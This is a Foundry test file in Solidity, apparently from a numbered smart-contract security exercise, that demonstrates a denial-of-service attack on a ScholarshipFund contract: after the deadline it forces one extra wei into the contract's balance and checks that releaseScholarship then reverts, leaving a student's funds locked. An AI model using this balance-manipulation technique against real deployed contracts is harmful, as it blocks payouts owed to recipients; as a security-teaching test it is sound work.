
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";           
import "../src/08_ScholarshipFund.sol";

contract Attack_scholarshipfund is Test{
    ScholarshipFund fund;
    address payable student_victim;

    function setUp() public {
        fund = new ScholarshipFund(100 ether , 3600 );
        vm.deal(address(fund),100 ether);
        student_victim = payable(makeAddr("student"));
    }

    function testit() public { 
        vm.warp(block.timestamp + 3601);
        uint256 previous_balance = address(fund).balance;
        vm.deal(address(fund),address(fund).balance+1);
        vm.expectRevert();
        emit log_named_uint("Eth before release : ",address(fund).balance);
        fund.releaseScholarship(student_victim);
        emit log_named_uint("Eth after release : ",address(fund).balance);
        assertGt(address(fund).balance , 0 );
    }
}
